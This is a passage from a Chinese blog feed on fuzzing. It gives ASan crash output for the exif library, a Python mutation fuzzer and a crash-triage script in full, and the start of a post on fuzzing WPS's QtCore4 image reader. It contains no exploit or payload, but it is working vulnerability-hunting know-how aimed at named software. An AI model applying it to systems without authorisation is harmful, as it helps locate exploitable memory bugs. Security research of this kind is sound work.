Sanitizer</code>，它是较新版本的<code>gcc</code>附带的有效工具，允许用户在编译二进制文件使用<code>-fsanitize=address</code>参数打开，并在发生内存访问错误时（即使是那些导致<code>crash</code>的时候）获得非常详细的信息，很显然，我们这里已经预选择了会崩溃的输入，所以我们错过该有效工具（笔者认为这里指的意思是在<code>fuzzing</code>的时候没有用<code>ASan</code>），但也许我们将会保存它在其他时间（使用）（笔者认为这里指的是在调<code>crash</code>的时候使用带<code>ASan</code>的编译后的二进制文件）。</p><p>为了使用 ASan，我跟着<a href="https://fuzzing-project.org/tutorial2.html">the Fuzzing Project</a>的思路，然后用如下<code>flags: cc -fsanitize=address -ggdb -o exifsan sample_main.c exif.c</code>重新编译了<code>exif</code> </p><p>然后为了方便使用我将<code>exifsan</code> 移动到<code>/usr/bin</code>，如果我们在<code>crash</code>样本上运行这个新编译的二进制文件，让我们看看输出吧</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~/crashes# exifsan crash<span class="hljs-number">.252</span>.jpg -verbosesystem: little-endian  data: little-endian===================================================================<span class="hljs-number">18831</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="hljs-number">0xb4d00758</span> at pc <span class="hljs-number">0x00415b9e</span> bp <span class="hljs-number">0xbf8c91f8</span> sp <span class="hljs-number">0xbf8c91ec</span>READ of size <span class="hljs-number">4</span> at <span class="hljs-number">0xb4d00758</span> thread T0                                                                                                  #<span class="hljs-number">0</span> <span class="hljs-number">0x415b9d</span> <span class="hljs-keyword">in</span> parseIFD /root/exif/exif.c:<span class="hljs-number">2356</span>    #<span class="hljs-number">1</span> <span class="hljs-number">0x408f10</span> <span class="hljs-keyword">in</span> createIfdTableArray /root/exif/exif.c:<span class="hljs-number">271</span>    #<span class="hljs-number">2</span> <span class="hljs-number">0x4076ba</span> <span class="hljs-keyword">in</span> main /root/exif/sample_main.c:<span class="hljs-number">63</span>    #<span class="hljs-number">3</span> <span class="hljs-number">0xb77d0ef0</span> <span class="hljs-keyword">in</span> __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span>    #<span class="hljs-number">4</span> <span class="hljs-number">0x407310</span> <span class="hljs-keyword">in</span> _start (/usr/bin/exifsan+<span class="hljs-number">0x2310</span>)<span class="hljs-number">0xb4d00758</span> <span class="hljs-keyword">is</span> located <span class="hljs-number">0</span> bytes to the right of <span class="hljs-number">8</span>-byte region [<span class="hljs-number">0xb4d00750</span>,<span class="hljs-number">0xb4d00758</span>)allocated by thread T0 here:                                                                                                            #<span class="hljs-number">0</span> <span class="hljs-number">0xb7aa2097</span> <span class="hljs-keyword">in</span> __interceptor_malloc (/lib/i386-linux-gnu/libasan.so<span class="hljs-number">.5</span>+<span class="hljs-number">0x10c097</span>)    #<span class="hljs-number">1</span> <span class="hljs-number">0x415a9f</span> <span class="hljs-keyword">in</span> parseIFD /root/exif/exif.c:<span class="hljs-number">2348</span>    #<span class="hljs-number">2</span> <span class="hljs-number">0x408f10</span> <span class="hljs-keyword">in</span> createIfdTableArray /root/exif/exif.c:<span class="hljs-number">271</span>    #<span class="hljs-number">3</span> <span class="hljs-number">0x4076ba</span> <span class="hljs-keyword">in</span> main /root/exif/sample_main.c:<span class="hljs-number">63</span>    #<span class="hljs-number">4</span> <span class="hljs-number">0xb77d0ef0</span> <span class="hljs-keyword">in</span> __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span>SUMMARY: AddressSanitizer: heap-buffer-overflow /root/exif/exif.c:<span class="hljs-number">2356</span> <span class="hljs-keyword">in</span> parseIFDShadow bytes around the buggy address:  <span class="hljs-number">0x369a0090</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a00a0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a00b0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a00c0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a00d0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa=&gt;<span class="hljs-number">0x369a00e0</span>: fa fa fa fa fa fa fa fa fa fa <span class="hljs-number">00</span>[fa]fa fa <span class="hljs-number">04</span> fa  <span class="hljs-number">0x369a00f0</span>: fa fa <span class="hljs-number">00</span> <span class="hljs-number">06</span> fa fa <span class="hljs-number">06</span> fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a0100</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a0110</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a0120</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  <span class="hljs-number">0x369a0130</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents <span class="hljs-number">8</span> application bytes):  Addressable:           <span class="hljs-number">00</span>  Partially addressable: <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">03</span> <span class="hljs-number">04</span> <span class="hljs-number">05</span> <span class="hljs-number">06</span> <span class="hljs-number">07</span>   Heap left redzone:       fa  Freed heap region:       fd  Stack left redzone:      f1  Stack mid redzone:       f2  Stack right redzone:     f3  Stack after <span class="hljs-keyword">return</span>:      f5  Stack use after scope:   f8  Global redzone:          f9  Global init order:       f6  Poisoned by user:        f7  Container overflow:      fc  Array cookie:            ac  Intra object redzone:    bb  ASan <span class="hljs-built_in">int</span>ernal:           fe  Left alloca redzone:     ca  Right alloca redzone:    cb  Shadow gap:              cc==<span class="hljs-number">18831</span>==ABORTING</code></pre><p>很不错，我们不仅可以获得详细信息，而且<code>ASan</code>还为我们区分了错误类别，告诉我们<code>crash</code>地址并提供一个很好的堆栈调用，正如你所见，我们在<code>exif.c</code>的<code>parseIFD </code>函数中执行了一个4字节的读操作。</p><pre><code class="hljs angelscript">READ of size <span class="hljs-number">4</span> at <span class="hljs-number">0xb4d00758</span> thread T0                                                                                                  #<span class="hljs-number">0</span> <span class="hljs-number">0x415b9d</span> <span class="hljs-keyword">in</span> parseIFD /root/exif/exif.c:<span class="hljs-number">2356</span>    #<span class="hljs-number">1</span> <span class="hljs-number">0x408f10</span> <span class="hljs-keyword">in</span> createIfdTableArray /root/exif/exif.c:<span class="hljs-number">271</span>    #<span class="hljs-number">2</span> <span class="hljs-number">0x4076ba</span> <span class="hljs-keyword">in</span> main /root/exif/sample_main.c:<span class="hljs-number">63</span>    #<span class="hljs-number">3</span> <span class="hljs-number">0xb77d0ef0</span> <span class="hljs-keyword">in</span> __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span>    #<span class="hljs-number">4</span> <span class="hljs-number">0x407310</span> <span class="hljs-keyword">in</span> _start (/usr/bin/exifsan+<span class="hljs-number">0x2310</span>)</code></pre><p>由于现在这都是标准二进制输出，我们实际上可以对这些<code>crash</code>进行分类并尝试理解它们，让我们首先尝试对<code>crash</code>进行冗余删除，有可能我们所有的30次崩溃都是同一个错误。也有可能我们有30次<code>unqiue crashes</code>（不太可能哈哈），所以我们需要解决这个问题。</p><p>让我们再次调用<code>Python</code>脚本，我们将遍历该文件夹，对每次<code>crash</code>运行启用<code>ASan</code>的二进制文件，并记录每个<code>crash</code>地址的位置，我们还将尝试捕获它是<code>READ</code>还是<code>WRITE</code>操作，例如，对于<code>crash.252.jpg</code>，我们将日志文件名字格式化为：<code>crash.252.HBO.b4f00758.READ</code>，并将<code>ASan</code>输出写入日志，这样我们甚至在打开日志之前就知道导致它的<code>crash</code>图片名、<code>bug</code>的类别、地址和操作。 （我会在最后贴检测和分类的脚本，太恶心了，我讨厌它）</p><p>在我们的<code>crashes</code>文件夹上运行检测和分类脚本后，我们现在可以看到我们已经分类了我们的<code>crashes</code>并且有一些非常有趣的东西。</p><pre><code class="hljs css"><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.102</span><span class="hljs-selector-class">.HBO</span><span class="hljs-selector-class">.b4f006d4</span><span class="hljs-selector-class">.READ</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.102</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.HBO</span><span class="hljs-selector-class">.b4f005dc</span><span class="hljs-selector-class">.READ</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.HBO</span><span class="hljs-selector-class">.b4f005dc</span><span class="hljs-selector-class">.READ</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.317</span><span class="hljs-selector-class">.HBO</span><span class="hljs-selector-class">.b4f005b4</span><span class="hljs-selector-class">.WRITE</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.317</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.285</span><span class="hljs-selector-class">.SEGV</span><span class="hljs-selector-class">.00000000</span><span class="hljs-selector-class">.READ</span><span class="hljs-selector-tag">crash</span><span class="hljs-selector-class">.285</span><span class="hljs-selector-class">.jpg</span><span class="hljs-selector-tag">------SNIP-----</span></code></pre><p>在那里进行了一次大<code>SNIP</code>之后，在我的30次<code>crash</code>中，我只有一次<code>WRITE</code>操作。你无法从截断的输出中看到，但我也有很多<code>SEGV</code>错误因为<code>NULL</code>地址被引用了(0x00000000)</p><p>让我们检查一下我们修改后的<code>fuzzer</code>，它只运行了100000次迭代的<code>magic()</code>编译，看看它是否找到任何<code>bugs</code></p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~/crashes2# lscrash<span class="hljs-number">.10354</span>.jpg  crash<span class="hljs-number">.2104</span>.jpg   crash<span class="hljs-number">.3368</span>.jpg   crash<span class="hljs-number">.45581</span>.jpg  crash<span class="hljs-number">.64750</span>.jpg  crash<span class="hljs-number">.77850</span>.jpg  crash<span class="hljs-number">.86367</span>.jpg  crash<span class="hljs-number">.94036</span>.jpgcrash<span class="hljs-number">.12771</span>.jpg  crash<span class="hljs-number">.21126</span>.jpg  crash<span class="hljs-number">.35852</span>.jpg  crash<span class="hljs-number">.46757</span>.jpg  crash<span class="hljs-number">.64987</span>.jpg  crash<span class="hljs-number">.78452</span>.jpg  crash<span class="hljs-number">.86560</span>.jpg  crash<span class="hljs-number">.9435</span>.jpgcrash<span class="hljs-number">.13341</span>.jpg  crash<span class="hljs-number">.23547</span>.jpg  crash<span class="hljs-number">.39494</span>.jpg  crash<span class="hljs-number">.46809</span>.jpg  crash<span class="hljs-number">.66340</span>.jpg  crash<span class="hljs-number">.78860</span>.jpg  crash<span class="hljs-number">.88799</span>.jpg  crash<span class="hljs-number">.94770</span>.jpgcrash<span class="hljs-number">.14060</span>.jpg  crash<span class="hljs-number">.24492</span>.jpg  crash<span class="hljs-number">.40953</span>.jpg  crash<span class="hljs-number">.49520</span>.jpg  crash<span class="hljs-number">.6637</span>.jpg   crash<span class="hljs-number">.79019</span>.jpg  crash<span class="hljs-number">.89072</span>.jpg  crash<span class="hljs-number">.95438</span>.jpgcrash<span class="hljs-number">.14905</span>.jpg  crash<span class="hljs-number">.25070</span>.jpg  crash<span class="hljs-number">.41505</span>.jpg  crash<span class="hljs-number">.50723</span>.jpg  crash<span class="hljs-number">.66389</span>.jpg  crash<span class="hljs-number">.79824</span>.jpg  crash<span class="hljs-number">.89738</span>.jpg  crash<span class="hljs-number">.95525</span>.jpgcrash<span class="hljs-number">.18188</span>.jpg  crash<span class="hljs-number">.27783</span>.jpg  crash<span class="hljs-number">.41700</span>.jpg  crash<span class="hljs-number">.52051</span>.jpg  crash<span class="hljs-number">.6718</span>.jpg   crash<span class="hljs-number">.81206</span>.jpg  crash<span class="hljs-number">.90506</span>.jpg  crash<span class="hljs-number">.96746</span>.jpgcrash<span class="hljs-number">.18350</span>.jpg  crash<span class="hljs-number">.2990</span>.jpg   crash<span class="hljs-number">.43509</span>.jpg  crash<span class="hljs-number">.54074</span>.jpg  crash<span class="hljs-number">.68527</span>.jpg  crash<span class="hljs-number">.8126</span>.jpg   crash<span class="hljs-number">.90648</span>.jpg  crash<span class="hljs-number">.98727</span>.jpgcrash<span class="hljs-number">.19441</span>.jpg  crash<span class="hljs-number">.30599</span>.jpg  crash<span class="hljs-number">.43765</span>.jpg  crash<span class="hljs-number">.55183</span>.jpg  crash<span class="hljs-number">.6987</span>.jpg   crash<span class="hljs-number">.82472</span>.jpg  crash<span class="hljs-number">.90745</span>.jpg  crash<span class="hljs-number">.9969</span>.jpgcrash<span class="hljs-number">.19581</span>.jpg  crash<span class="hljs-number">.31243</span>.jpg  crash<span class="hljs-number">.43813</span>.jpg  crash<span class="hljs-number">.5857</span>.jpg   crash<span class="hljs-number">.70713</span>.jpg  crash<span class="hljs-number">.83282</span>.jpg  crash<span class="hljs-number">.92426</span>.jpgcrash<span class="hljs-number">.19907</span>.jpg  crash<span class="hljs-number">.31563</span>.jpg  crash<span class="hljs-number">.44974</span>.jpg  crash<span class="hljs-number">.59625</span>.jpg  crash<span class="hljs-number">.77590</span>.jpg  crash<span class="hljs-number">.83284</span>.jpg  crash<span class="hljs-number">.92775</span>.jpgcrash<span class="hljs-number">.2010</span>.jpg   crash<span class="hljs-number">.32642</span>.jpg  crash<span class="hljs-number">.4554</span>.jpg   crash<span class="hljs-number">.64255</span>.jpg  crash<span class="hljs-number">.77787</span>.jpg  crash<span class="hljs-number">.84766</span>.jpg  crash<span class="hljs-number">.92906</span>.jpg</code></pre><p>这有一堆<code>crashes</code></p><h2 id="Getting-Serious-Conclusion"><a href="#Getting-Serious-Conclusion" class="headerlink" title="Getting Serious, Conclusion"></a>Getting Serious, Conclusion</h2><p><code>fuzzer</code>可以进行很多优化，目前它真的很粗糙，只是为了演示非常基本的编译<code>fuzzing</code>，<code>bug</code>分类过程也是一团糟，感觉整个过程都很<code>hacky</code>，我想我需要看更多<code>@gamozolabs</code>的视频，也许下次我们进行模糊测试时，我们会尝试一个更难的目标，用<code>Rust</code>或<code>Go</code>等很酷的语言编写模糊测试，我们将会尝试真正改进分类过程/利用其中一个<code>bugs</code>！</p><p>感谢博文中提到的每个人，非常感谢</p><p>直到下一次！</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p><code>JPEGfuzz.py</code></p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> random<span class="hljs-keyword">from</span> pexpect <span class="hljs-keyword">import</span> run<span class="hljs-keyword">from</span> pipes <span class="hljs-keyword">import</span> quote<span class="hljs-comment"># read bytes from our valid JPEG and return them in a mutable bytearray </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_bytes</span>(<span class="hljs-params">filename</span>):</span>    f = open(filename, <span class="hljs-string">&quot;rb&quot;</span>).read()    <span class="hljs-keyword">return</span> bytearray(f)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bit_flip</span>(<span class="hljs-params">data</span>):</span>    num_of_flips = int((len(data) - <span class="hljs-number">4</span>) * <span class="hljs-number">.01</span>)    indexes = range(<span class="hljs-number">4</span>, (len(data) - <span class="hljs-number">4</span>))    chosen_indexes = []    <span class="hljs-comment"># iterate selecting indexes until we&#x27;ve hit our num_of_flips number</span>    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; num_of_flips:        chosen_indexes.append(random.choice(indexes))        counter += <span class="hljs-number">1</span>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> chosen_indexes:        current = data[x]        current = (bin(current).replace(<span class="hljs-string">&quot;0b&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))        current = <span class="hljs-string">&quot;0&quot;</span> * (<span class="hljs-number">8</span> - len(current)) + current                indexes = range(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>)        picked_index = random.choice(indexes)        new_number = []        <span class="hljs-comment"># our new_number list now has all the digits, example: [&#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;]</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> current:            new_number.append(i)        <span class="hljs-comment"># if the number at our randomly selected index is a 1, make it a 0, and vice versa</span>        <span class="hljs-keyword">if</span> new_number[picked_index] == <span class="hljs-string">&quot;1&quot;</span>:            new_number[picked_index] = <span class="hljs-string">&quot;0&quot;</span>        <span class="hljs-keyword">else</span>:            new_number[picked_index] = <span class="hljs-string">&quot;1&quot;</span>        <span class="hljs-comment"># create our new binary string of our bit-flipped number</span>        current = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> new_number:            current += i        <span class="hljs-comment"># convert that string to an integer</span>        current = int(current,<span class="hljs-number">2</span>)        <span class="hljs-comment"># change the number in our byte array to our new number we just constructed</span>        data[x] = current    <span class="hljs-keyword">return</span> data<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">data</span>):</span>    magic_vals = [    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">127</span>),    (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">2</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">255</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">0</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">128</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">64</span>),    (<span class="hljs-number">4</span>, <span class="hljs-number">127</span>)    ]    picked_magic = random.choice(magic_vals)    length = len(data) - <span class="hljs-number">8</span>    index = range(<span class="hljs-number">0</span>, length)    picked_index = random.choice(index)    <span class="hljs-comment"># here we are hardcoding all the byte overwrites for all of the tuples that begin (1, )</span>    <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFF</span>            data[picked_index] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">127</span>:<span class="hljs-comment"># 0x7F</span>            data[picked_index] = <span class="hljs-number">127</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x00</span>            data[picked_index] = <span class="hljs-number">0</span>    <span class="hljs-comment"># here we are hardcoding all the byte overwrites for all of the tuples that begin (2, )</span>    <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">2</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFFFF</span>            data[picked_index] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x0000</span>            data[picked_index] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>    <span class="hljs-comment"># here we are hardcoding all of the byte overwrites for all of the tuples that being (4, )</span>    <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">0</span>] == <span class="hljs-number">4</span>:        <span class="hljs-keyword">if</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">255</span>:<span class="hljs-comment"># 0xFFFFFFFF</span>            data[picked_index] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">255</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<span class="hljs-comment"># 0x00000000</span>            data[picked_index] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">128</span>:<span class="hljs-comment"># 0x80000000</span>            data[picked_index] = <span class="hljs-number">128</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">64</span>:<span class="hljs-comment"># 0x40000000</span>            data[picked_index] = <span class="hljs-number">64</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span>        <span class="hljs-keyword">elif</span> picked_magic[<span class="hljs-number">1</span>] == <span class="hljs-number">127</span>:<span class="hljs-comment"># 0x7FFFFFFF</span>            data[picked_index] = <span class="hljs-number">127</span>            data[picked_index + <span class="hljs-number">1</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">2</span>] = <span class="hljs-number">255</span>            data[picked_index + <span class="hljs-number">3</span>] = <span class="hljs-number">255</span>            <span class="hljs-keyword">return</span> data<span class="hljs-comment"># create new jpg with mutated data</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_new</span>(<span class="hljs-params">data</span>):</span>    f = open(<span class="hljs-string">&quot;mutated.jpg&quot;</span>, <span class="hljs-string">&quot;wb+&quot;</span>)    f.write(data)    f.close()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exif</span>(<span class="hljs-params">counter,data</span>):</span>    command = <span class="hljs-string">&quot;exif mutated.jpg -verbose&quot;</span>    out, returncode = run(<span class="hljs-string">&quot;sh -c &quot;</span> + quote(command), withexitstatus=<span class="hljs-number">1</span>)    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Segmentation&quot;</span> <span class="hljs-keyword">in</span> out:        f = open(<span class="hljs-string">&quot;crashes2/crash.&#123;&#125;.jpg&quot;</span>.format(str(counter)), <span class="hljs-string">&quot;ab+&quot;</span>)        f.write(data)    <span class="hljs-keyword">if</span> counter % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>:        print(counter, end=<span class="hljs-string">&quot;\r&quot;</span>)<span class="hljs-keyword">if</span> len(sys.argv) &lt; <span class="hljs-number">2</span>:    print(<span class="hljs-string">&quot;Usage: JPEGfuzz.py &lt;valid_jpg&gt;&quot;</span>)<span class="hljs-keyword">else</span>:    filename = sys.argv[<span class="hljs-number">1</span>]    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; <span class="hljs-number">100000</span>:        data = get_bytes(filename)        functions = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]        picked_function = random.choice(functions)        <span class="hljs-keyword">if</span> picked_function == <span class="hljs-number">0</span>:            mutated = magic(data)            create_new(mutated)            exif(counter,mutated)        <span class="hljs-keyword">else</span>:            mutated = bit_flip(data)            create_new(mutated)            exif(counter,mutated)        counter += <span class="hljs-number">1</span></code></pre><p><code>triage.py</code></p><pre><code class="hljs python3">#!&#x2F;usr&#x2F;bin&#x2F;env python3import osfrom os import listdirdef get_files():    files &#x3D; os.listdir(&quot;&#x2F;root&#x2F;crashes&#x2F;&quot;)    return filesdef triage_files(files):    for x in files:        original_output &#x3D; os.popen(&quot;exifsan &quot; + x + &quot; -verbose 2&gt;&amp;1&quot;).read()        output &#x3D; original_output                # Getting crash reason        crash &#x3D; &#39;&#39;        if &quot;SEGV&quot; in output:            crash &#x3D; &quot;SEGV&quot;        elif &quot;heap-buffer-overflow&quot; in output:            crash &#x3D; &quot;HBO&quot;        else:            crash &#x3D; &quot;UNKNOWN&quot;                if crash &#x3D;&#x3D; &quot;HBO&quot;:            output &#x3D; output.split(&quot;\n&quot;)            counter &#x3D; 0            while counter &lt; len(output):                if output[counter] &#x3D;&#x3D; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;:                    target_line &#x3D; output[counter + 1]                    target_line2 &#x3D; output[counter + 2]                    counter +&#x3D; 1                else:                    counter +&#x3D; 1            target_line &#x3D; target_line.split(&quot; &quot;)            address &#x3D; target_line[5].replace(&quot;0x&quot;,&quot;&quot;)                        target_line2 &#x3D; target_line2.split(&quot; &quot;)            operation &#x3D; target_line2[0]                    elif crash &#x3D;&#x3D; &quot;SEGV&quot;:            output &#x3D; output.split(&quot;\n&quot;)            counter &#x3D; 0            while counter &lt; len(output):                if output[counter] &#x3D;&#x3D; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;:                    target_line &#x3D; output[counter + 1]                    target_line2 &#x3D; output[counter + 2]                    counter +&#x3D; 1                else:                    counter +&#x3D; 1            if &quot;unknown address&quot; in target_line:                address &#x3D; &quot;00000000&quot;            else:                address &#x3D; None            if &quot;READ&quot; in target_line2:                operation &#x3D; &quot;READ&quot;            elif &quot;WRITE&quot; in target_line2:                operation &#x3D; &quot;WRITE&quot;            else:                operation &#x3D; None        log_name &#x3D; (x.replace(&quot;.jpg&quot;,&quot;&quot;) + &quot;.&quot; + crash + &quot;.&quot; + address + &quot;.&quot; + operation)        f &#x3D; open(log_name,&quot;w+&quot;)        f.write(original_output)        f.close()files &#x3D; get_files()triage_files(files)</code></pre>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对wps的qtcore的某一接口fuzz</title>
    <link href="/2022/03/29/wps%20fuzz/"/>
    <url>/2022/03/29/wps%20fuzz/</url>
    
    <content type="html"><![CDATA[<p>主要看到以下三篇<code>blog</code></p><blockquote><p><a href="http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html">http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html</a><br><a href="https://www.anquanke.com/post/id/240938">https://www.anquanke.com/post/id/240938</a><br><a href="https://ruan777.github.io/2021/06/02/%E4%BD%BF%E7%94%A8winafl%E5%AF%B9qtcore%E7%9A%84%E4%B8%80%E6%AC%A1fuzz%E5%B0%9D%E8%AF%95">https://ruan777.github.io/2021/06/02/使用winafl对qtcore的一次fuzz尝试</a></p></blockquote><p>因此尝试对<code>linux</code>上的<code>wps</code>的<code>qtcore4</code>进行<code>fuzz</code></p><pre><code class="hljs yaml"><span class="hljs-string">环境：</span><span class="hljs-attr">linux:</span> <span class="hljs-string">ubuntu</span> <span class="hljs-number">20.04</span><span class="hljs-attr">wps:</span> <span class="hljs-number">11.1</span><span class="hljs-number">.0</span><span class="hljs-number">.10161</span><span class="hljs-attr">libcQtCore:</span> <span class="hljs-number">4.7</span><span class="hljs-number">.4</span></code></pre><h2 id="整体的逻辑"><a href="#整体的逻辑" class="headerlink" title="整体的逻辑"></a>整体的逻辑</h2><p>根据<code>Nafiez</code>的报告，可以知道，主要是<code>kso.dll</code>中调用<code>QtCore4.dll</code>的<code>QImageReader::read()</code>出错的，因此后续两篇文章均对于<code>QtCore4.dll</code>的该接口进行<code>fuzz</code></p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>:<span class="hljs-number">000</span>&gt; !heap -p -a cc<span class="hljs-number">53</span>afbc    <span class="hljs-attribute">address</span> cc<span class="hljs-number">53</span>afbc found in    <span 